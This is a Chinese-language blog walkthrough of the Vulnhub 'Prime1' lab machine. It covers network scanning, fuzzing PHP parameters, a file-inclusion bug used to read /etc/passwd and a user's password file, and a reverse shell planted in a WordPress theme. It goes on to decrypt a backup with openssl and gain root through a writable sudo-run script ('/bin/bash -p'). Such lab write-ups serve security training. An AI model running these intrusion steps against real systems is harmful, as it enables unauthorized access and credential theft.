+++
date = '2026-10-25T21:35:40+08:00'
draft = false
title = '[Vulnhub靶机]Prime1渗透记录'
tags = ['渗透','Vulnhub','WordPress','Fuzz','openssl']
+++

## 信息收集

攻击机IP: 192.168.200.146
使用arp-scan发现靶机IP: 192.168.200.166

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ sudo arp-scan -l                                                   
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 192.168.200.146
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.200.1   00:50:56:c0:00:08       VMware, Inc.
192.168.200.2   00:50:56:fc:41:2a       VMware, Inc.
192.168.200.166 00:0c:29:99:7e:35       VMware, Inc.
192.168.200.254 00:50:56:ec:d0:be       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.016 seconds (126.98 hosts/sec). 4 responded
```

端口扫描

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ sudo nmap -sT --min-rate 10000 -p- 192.168.200.166                 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 22:28 +0800
Nmap scan report for 192.168.200.166
Host is up (0.00071s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:99:7E:35 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.85 seconds
```

对发现的端口进行深入扫描

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ sudo nmap -sT -sV -sC -p22,80 192.168.200.166                              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 22:29 +0800
Nmap scan report for 192.168.200.166
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)
|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)
|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: HacknPentest
MAC Address: 00:0C:29:99:7E:35 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.17 seconds
```

对目标进行漏洞扫描

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ sudo nmap --script=vuln -p22,80 192.168.200.166                            
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-25 22:30 +0800
Nmap scan report for 192.168.200.166
Host is up (0.00037s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
MAC Address: 00:0C:29:99:7E:35 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.54 seconds
```

浏览器访问80端口, 是一个图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1.avif)

Nmap漏洞扫描中显示/wordpress/是个Blog, 访问发现果然是Wordpress

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E5%8F%91%E7%8E%B0wordpress.avif)

dirsearch爆破发现/dev

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/dirsearch%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E6%A0%B9.avif)

访问后发现是一段文本

```text
hello,

now you are at level 0 stage.

In real life pentesting we should use our tools to dig on a web very hard.

Happy hacking. 
```

使用dirb重扫, 发现secret.txt

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ dirb http://192.168.200.166/ -X .txt,.zip,.sql,.gz  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Oct 26 19:31:22 2026
URL_BASE: http://192.168.200.166/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.txt,.zip,.sql,.gz) | (.txt)(.zip)(.sql)(.gz) [NUM = 4]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.200.166/ ----
+ http://192.168.200.166/secret.txt (CODE:200|SIZE:412)                                                                                   
                                                                                                                                          
-----------------
END_TIME: Mon Oct 26 19:31:31 2026
DOWNLOADED: 18448 - FOUND: 1
```

访问后是一段文本提示我们对php页面的参数进行模糊测试

```text
Looks like you have got some secrets.

Ok I just want to do some help to you. 

Do some more fuzz on every page of php which was finded by you. And if
you get any right parameter then follow the below steps. If you still stuck 
Learn from here a basic tool with good usage for OSCP.

https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web
 


//see the location.txt and you will get your next move//
```

扫描网站的php文件, 发现index.php和image.php

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E6%89%AB%E6%8F%8Fphp%E6%96%87%E4%BB%B6.avif)

对这两个网站进行模糊测试, 最终发现index.php存在file参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E5%8F%91%E7%8E%B0file%E5%8F%82%E6%95%B0.avif)

访问http://192.168.200.166/index.php?file=test, 发现页面多了两行文字, 意思是你正在挖错误的文件

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ curl http://192.168.200.166/index.php?file=test
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>you are digging wrong file</html>
```

将test换成location.txt, 发现提示我们用secrettier360参数测试其它php页面

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ curl http://192.168.200.166/index.php?file=location.txt 
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" />
</body>

Do something better <br><br><br><br><br><br>ok well Now you reah at the exact parameter <br><br>Now dig some more for next one <br>use 'secrettier360' parameter on some other php page for more fun.
</html>
```

使用该参数去请求image.php, 提示我们获得了正确的参数

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ curl http://192.168.200.166/image.php?secrettier360=test
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br></html>
```

## 漏洞利用

将test改为/etc/passwd, 返回靶机用户信息

```shell
┌──(kali㉿kali)-[~/Prime1]                                                                                                                 
└─$ curl http://192.168.200.166/image.php?secrettier360=/etc/passwd                
<html>                                                                             
<title>HacknPentest</title>                                                                                                                                            
<body>                                                                                                                  
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>                                                                               
</body>                                                                                      
finaly you got the right parameter<br><br><br><br>root:x:0:0:root:/root:/bin/bash                                                          
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                              
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                       
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                       
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                         
games:x:5:60:games:/usr/games:/usr/sbin/nologin                                    
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                    
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                             
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                             
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                                                                      
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                     
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                                                             
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                         
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                         
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin      
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin                                                                        
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin                        
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin                                              
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false                                                         
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false                                  
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false                            
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false                                
syslog:x:104:108::/home/syslog:/bin/false                                                    
_apt:x:105:65534::/nonexistent:/bin/false                                                    
messagebus:x:106:110::/var/run/dbus:/bin/false                                                          
uuidd:x:107:111::/run/uuidd:/bin/false                                                                                  
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false                                      
whoopsie:x:109:117::/nonexistent:/bin/false                                                             
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false                         
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false                                    
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false                                                 
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false                                          
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false                                   
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false                                                           
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false                                                        
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false                                                         
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false                 
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
victor:x:1000:1000:victor,,,:/home/victor:/bin/bash    
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false                                                                 
saket:x:1001:1001:find password.txt file in my directory:/home/saket:
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
</html>
```

注意saket用户的GECOS(用户详细信息)中提示"find password.txt file in my directory", 且该用户的家目录位于/home/saket, 尝试文件包含读取

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ curl http://192.168.200.166/image.php?secrettier360=/home/saket/password.txt
<html>
<title>HacknPentest</title>
<body>
 <img src='hacknpentest.png' alt='hnp security' width="1300" height="595" /></p></p></p>
</body>
finaly you got the right parameter<br><br><br><br>follow_the_ippsec
</html>
```

使用follow_the_ippsec为密码尝试SSH登录saket和victor, 都失败了

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ ssh saket@192.168.200.166
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
saket@192.168.200.166's password: 
Permission denied, please try again.
saket@192.168.200.166's password: 

                                                                                                                                           
┌──(kali㉿kali)-[~/Prime1]
└─$ ssh victor@192.168.200.166
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
victor@192.168.200.166's password: 
Permission denied, please try again.
victor@192.168.200.166's password:
```

尝试登录wordpress, 发现用户名victory密码follow_the_ippsec成功登录

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E7%99%BB%E5%BD%95wordpress.avif)

在Theme Editor中, 找到了一个可以编辑的php文件secret.php, 向其插入反弹shell代码

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E6%8F%92%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC.avif)

在靶机4444端口开启监听, 访问http://192.168.200.166/wordpress/wp-content/themes/twentynineteen/secret.php, 即可拿到shell

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.200.146] from (UNKNOWN) [192.168.200.166] 39880
bash: cannot set terminal process group (1425): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentynineteen$
```

## 权限提升

终端升级

```shell
python -c "import pty;pty.spawn('/bin/bash')"
```

### openssl解密

在/home目录中, 可以发现saket和victor两个目录, 其中victor目录无法查看

```shell
www-data@ubuntu:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Aug 29  2019 .
drwxr-xr-x 24 root   root   4096 Oct 25 07:05 ..
drwxr-xr-x  2 root   root   4096 Aug 31  2019 saket
drwxr-x--x 20 victor victor 4096 Sep  1  2019 victor
```

仅如saket, 发现有三个文件, 其中password.txt是之前通过文件包含读取到的密码

```shell
www-data@ubuntu:/home/saket$ ls -lha
ls -lha
total 36K
drwxr-xr-x 2 root root 4.0K Aug 31  2019 .
drwxr-xr-x 4 root root 4.0K Aug 29  2019 ..
-rw------- 1 root root   20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root  14K Aug 30  2019 enc
-rw-r--r-- 1 root root   18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root   33 Aug 31  2019 user.txt
```

查看user.txt, 里面有一串md5字符串

```shell
www-data@ubuntu:/home/saket$ cat user.txt
cat user.txt
af3c658dcf9d7190da3153519c003456
```

使用sudo -l, 发现可以无密码以sudo权限执行/home/saket/enc

```shell
www-data@ubuntu:/home/saket$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (root) NOPASSWD: /home/saket/enc
```

执行enc, 提示输入密码, 尝试password.txt和user.txt, 都不行

```shell
www-data@ubuntu:/home/saket$ sudo ./enc
sudo ./enc
enter password: af3c658dcf9d7190da3153519c003456
af3c658dcf9d7190da3153519c003456
www-data@ubuntu:/home/saket$ sudo ./enc
sudo ./enc
enter password: follow_the_ippsec
follow_the_ippsec
www-data@ubuntu:/home/saket$
```

搜索备份相关文件

```shell
find / -name '*backup*' 2>/dev/null | sort | less
```

发现/opt/backup, cd过去发现里面有server_database

```shell
www-data@ubuntu:/opt/backup$ ls -la
ls -la
total 12
drwxr-xr-x 3 root root 4096 Aug 30  2019 .
drwxr-xr-x 3 root root 4096 Aug 30  2019 ..
drwxr-xr-x 2 root root 4096 Aug 30  2019 server_database
```

发现两个文件

```shell
www-data@ubuntu:/opt/backup/server_database$ ls -lha
ls -lha
total 12K
drwxr-xr-x 2 root root 4.0K Aug 30  2019 .
drwxr-xr-x 3 root root 4.0K Aug 30  2019 ..
-rw-r--r-- 1 root root   75 Aug 30  2019 backup_pass
-rw-r--r-- 1 root root    0 Aug 30  2019 {hello.8}
```

从backup_pass得知`backup_database`文件的密码是`backup_password`

```text
your password for backup_database file enc is 

"backup_password"


Enjoy!
```

{hello.8}是空文件, 读取没有任何内容

```shell
www-data@ubuntu:/opt/backup/server_database$ cat ./{hello.8}
cat ./{hello.8}
```

重新运行enc, 输入密码后返回good, 同时在当前目录下产生enc.txt和key.txt

```shell
www-data@ubuntu:/home/saket$ sudo ./enc
sudo ./enc
enter password: backup_password
good
www-data@ubuntu:/home/saket$ ls -lha
ls -lha
total 44K
drwxr-xr-x 2 root root 4.0K Oct 27 07:15 .
drwxr-xr-x 4 root root 4.0K Aug 29  2019 ..
-rw------- 1 root root   20 Aug 31  2019 .bash_history
-rwxr-x--x 1 root root  14K Aug 30  2019 enc
-rw-r--r-- 1 root root  237 Oct 27 07:15 enc.txt
-rw-r--r-- 1 root root  123 Oct 27 07:15 key.txt
-rw-r--r-- 1 root root   18 Aug 29  2019 password.txt
-rw-r--r-- 1 root root   33 Aug 31  2019 user.txt
```

enc.txt中是一串Base64字符串

```text
nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=
```

解码后发现不是可阅读的文字, 应该是被加密了

```text
?L.�ocX(���K��r�t�=�B�w�w��8*_��E#���m8Bz\�7p�Jv��v�,6ב��;X�G'+�P���Xٙ�׿;j;f���YS1
           �
��Ֆt7
```

key.txt中提示我们使用md5哈希转换`ippsec`字符串

```text
I know you are the fan of ippsec.

So convert string "ippsec" into md5 hash and use it to gain yourself in your real form.
```

根据这两个文件可知, enc.txt是被Base64编码的使用对称加密算法加密的密文, 而ippsec的md5哈希则是key, 我们需要解密enc.txt但却不知道加密算法, 那么我们可以通过openssl把常见的加密算法都试一遍, 看看哪个能解出来

使用md5sum完成对ippsec的哈希, 得到key, 注意echo要加上-n放置输出换行符

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ echo -n 'ippsec' | md5sum
366a74cb3c959de17d61db30591c39d1  -
```

将enc.txt保存在文件中, 注意此时不应使用-n参数, 因为openssl按行处理Base64, 最后一行没有换行符时会因为末尾块未完整解码而导致块错误

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ echo 'nzE+iKr82Kh8BOQg0k/LViTZJup+9DReAsXd/PCtFZP5FHM7WtJ9Nz1NmqMi9G0i7rGIvhK2jRcGnFyWDT9MLoJvY1gZKI2xsUuS3nJ/n3T1Pe//4kKId+B3wfDW/TgqX6Hg/kUj8JO08wGe9JxtOEJ6XJA3cO/cSna9v3YVf/ssHTbXkb+bFgY7WLdHJyvF6lD/wfpY2ZnA1787ajtm+/aWWVMxDOwKuqIT1ZZ0Nw4=' > enc.txt
```

使用openssl --help可列出所有支持的加密算法, 将它们保存到enclist.txt中

```text
Cipher commands (see the `enc' command for more details)
aes-128-cbc       aes-128-ecb       aes-192-cbc       aes-192-ecb       
aes-256-cbc       aes-256-ecb       aria-128-cbc      aria-128-cfb      
aria-128-cfb1     aria-128-cfb8     aria-128-ctr      aria-128-ecb      
aria-128-ofb      aria-192-cbc      aria-192-cfb      aria-192-cfb1     
aria-192-cfb8     aria-192-ctr      aria-192-ecb      aria-192-ofb      
aria-256-cbc      aria-256-cfb      aria-256-cfb1     aria-256-cfb8     
aria-256-ctr      aria-256-ecb      aria-256-ofb      base64            
bf                bf-cbc            bf-cfb            bf-ecb            
bf-ofb            camellia-128-cbc  camellia-128-ecb  camellia-192-cbc  
camellia-192-ecb  camellia-256-cbc  camellia-256-ecb  cast              
cast-cbc          cast5-cbc         cast5-cfb         cast5-ecb         
cast5-ofb         des               des-cbc           des-cfb           
des-ecb           des-ede           des-ede-cbc       des-ede-cfb       
des-ede-ofb       des-ede3          des-ede3-cbc      des-ede3-cfb      
des-ede3-ofb      des-ofb           des3              desx              
rc2               rc2-40-cbc        rc2-64-cbc        rc2-cbc           
rc2-cfb           rc2-ecb           rc2-ofb           rc4               
rc4-40            seed              seed-cbc          seed-cfb          
seed-ecb          seed-ofb          sm4-cbc           sm4-cfb           
sm4-ctr           sm4-ecb           sm4-ofb           zlib              
zstd
```

将其做成字典, 每一行是一个加密算法

```shell
awk '{gsub(/ /,"\n");print}' enclist.txt | sort | uniq > CipherTypes.txt
```

使用for循环遍历所有加密算法, 使用openssl进行解密

| openssl选项 | 解释 |
| ---- | ---- |
| -d | 解密模式 |
| -a | base64解码 |
| -$Cipher | 指定加密算法 |
| -K | 指定十六进制格式的Key |

```shell
for Cipher in $(cat CipherTypes.txt); do cat enc.txt | openssl enc -d -a -$Cipher -K 366a74cb3c959de17d61db30591c39d1 2>/dev/null; echo $Cipher; done
```

没有一个成功

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8md5%E4%BD%9Ckey%E6%97%A0%E7%BB%93%E6%9E%9C1.avif)

尝试将md5得到的key逐字符将ASCII码转换为16进制数

| od选项 | 解释 |
| ------ | ---- |
| -A n | 不显示地址偏移 |
| -t x1 | 每1个字节用十六进制表示 |

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ echo -n 'ippsec' | md5sum | awk '{print $1}' | tr -d '\n' | od -A n -t x1 | tr -d '\n' | tr -d ' '
3336366137346362336339353964653137643631646233303539316333396431
```

再次尝试, 发现当使用aes-256-ecb算法时成功解密, 根据密文我们得知saket的密码为`tribute_to_ippsec`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Prime1/%E8%A7%A3%E5%AF%86%E6%88%90%E5%8A%9F.avif)

### 提权

ssh登录saket账户

```shell
┌──(kali㉿kali)-[~/Prime1]
└─$ ssh saket@192.168.200.166
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
saket@192.168.200.166's password: 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.15.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

197 packages can be updated.
4 updates are security updates.

New release '18.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Oct 28 06:02:57 2026 from 192.168.200.146
$
```

sudo -l发现能无密码运行`/home/victor/undefeated_victor`

```shell
$ sudo -l
Matching Defaults entries for saket on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User saket may run the following commands on ubuntu:
    (root) NOPASSWD: /home/victor/undefeated_victor
```

运行后输出一段话, 直译过来是"如果你能打败我，那么就在你面前向我发起挑战吧", 并提示`/tmp/challenge`这个文件不存在

```shell
$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
/home/victor/undefeated_victor: 2: /home/victor/undefeated_victor: /tmp/challenge: not found
```

创建/tmp/challenge并在里面写入echo test, 赋予执行权限, 然后运行/tmp/challenge, 发现我们写的代码被执行了

```shell
echo 'echo test' > challenge
sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
test
```

向challenge写入提权命令, 再运行undefeated_victor, 即可提权

```shell
saket@ubuntu:/tmp$ echo '/bin/bash -p' > challenge
saket@ubuntu:/tmp$ sudo /home/victor/undefeated_victor
if you can defeat me then challenge me in front of you
root@ubuntu:/tmp# whoami
root
```

读取flag

```shell
root@ubuntu:/tmp# cd /root
root@ubuntu:/root# ls -lah
total 92K
drwx------  5 root root 4.0K Aug 31  2019 .
drwxr-xr-x 24 root root 4.0K Oct 25 07:05 ..
-rw-------  1 root root 8.4K Sep  1  2019 .bash_history
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
drwx------  3 root root 4.0K Aug 30  2019 .cache
-rwxr-xr-x  1 root root  14K Aug 30  2019 enc
-rw-r--r--  1 root root  305 Aug 30  2019 enc.cpp
-rw-r--r--  1 root root  237 Aug 30  2019 enc.txt
-rw-r--r--  1 root root  123 Aug 30  2019 key.txt
-rw-------  1 root root  137 Aug 30  2019 .mysql_history
drwxr-xr-x  2 root root 4.0K Aug 29  2019 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Aug 30  2019 root.txt
-rw-r--r--  1 root root   66 Aug 31  2019 .selected_editor
-rw-r--r--  1 root root  805 Aug 30  2019 sql.py
-rwxr-xr-x  1 root root  442 Aug 31  2019 t.sh
drwxr-xr-x 10 root root 4.0K Aug 30  2019 wfuzz
-rw-r--r--  1 root root  170 Aug 29  2019 wordpress.sql
root@ubuntu:/root# cat root.txt
b2b17036da1de94cfb024540a8e7075a
```
